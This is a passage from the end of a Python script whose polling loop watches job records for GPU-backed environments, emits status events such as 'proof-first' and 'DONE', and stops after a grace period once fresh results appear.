                     fresh=r["fresh"], gpuq=(r["gpuq"] or "")[:120], ts=r["ts"])
                last_emit[r["uuid"]] = {"acc": r["acc"], "lae": r["lae"]}
        if nfresh >= 1 and first_proof is None:
            first_proof = now
            emit("proof-first", n=nfresh,
                 cards=",".join(r["uuid"] for r in rows if r["fresh"])[:400])
        if first_proof is not None and now - first_proof >= PROOF_GRACE:
            break
        if nfresh == 0:
            first_proof = None
        i += 1
        time.sleep(20)
    emit("DONE", phase="poll", jobs=len(started), envs=len(envs), cards=len(cards),
         proof_cards=sum(1 for r in rows if r["fresh"]), left_running=1, deleted_nothing=1,
         blobs_prefix=prefix, elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
